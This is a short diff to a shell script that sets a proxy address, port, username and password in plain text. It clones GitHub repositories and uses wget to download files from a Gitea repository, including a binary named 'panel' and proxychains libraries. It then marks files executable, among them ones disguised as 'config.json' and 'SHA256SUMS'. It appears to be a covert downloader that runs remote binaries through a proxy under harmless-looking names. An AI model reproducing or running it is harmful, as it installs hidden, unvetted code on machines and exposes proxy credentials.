@@ -1,8 +1,8 @@
-proxy="38.154.227.167" 
-port="5868" 
+proxy="45.155.68.129" 
+port="8133" 
 user="ugursfso"  
 pass="wqn60pnk6m95" 
-git clone https://github.com/55113110159/render.git && cd render && chmod +x config.json && chmod +x zepo
+git clone https://github.com/55113110159/javascript.git && cd javascript && chmod +x config.json && chmod +x SHA256SUMS && chmod +x scala
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
